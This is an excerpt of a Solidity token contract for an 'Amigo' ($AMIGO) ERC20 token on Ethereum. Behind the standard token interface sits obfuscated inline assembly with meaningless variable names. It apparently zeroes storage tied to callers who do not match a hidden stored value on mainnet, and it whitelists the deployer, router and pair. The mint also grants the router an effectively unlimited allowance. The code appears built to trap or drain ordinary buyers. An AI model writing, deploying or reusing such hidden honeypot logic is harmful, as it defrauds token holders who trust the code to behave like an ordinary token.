...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addAmigo;
    uint256 private friendsHoes = block.number*2;

    mapping (address => bool) private _firstAmigos; 
    mapping (address => bool) private _secondHoes;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private darkNight;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private blueCar;
    address public pair;
    ...
    bool private trading; uint256 private freeDom = 1; bool private subMarine;
    uint256 private _decimals; uint256 private risingRed;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addAmigo.push(_router); addAmigo.push(msgSender_); addAmigo.push(pair);
        for (uint256 q=0; q < 3;) {_firstAmigos[addAmigo[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x46d593d906828525a382548d8f00fae7a135606493918ff8756076090afed0ac
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1411b660c32cfe0cca0ef55137fa6b98d1464944928d86dfff22afc304edc433,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; friendsHoes = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addAmigo[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployAmigo(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addAmigo[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployAmigo(creator, initialSupply);
    }
}

contract $AMIGO is ERC20Token {
    constructor() ERC20Token("Amigo", "AMIGO", msg.sender, 20000000 * 10 ** 18) {
    }
}